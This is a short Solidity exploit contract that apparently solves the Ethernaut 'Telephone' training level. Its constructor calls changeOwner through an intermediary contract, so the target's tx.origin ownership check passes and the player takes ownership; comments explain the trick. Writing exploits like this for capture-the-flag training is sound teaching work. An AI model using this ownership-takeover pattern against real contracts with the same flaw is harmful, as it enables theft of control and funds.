// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Telephone} from "ethernaut/levels/Telephone.sol";

contract Attacker {
    constructor(Telephone target) {
        // the msg.sender of this contract is our player
        // but the msg.sender from the target's perspective is this contract
        target.changeOwner(msg.sender);
    }
}
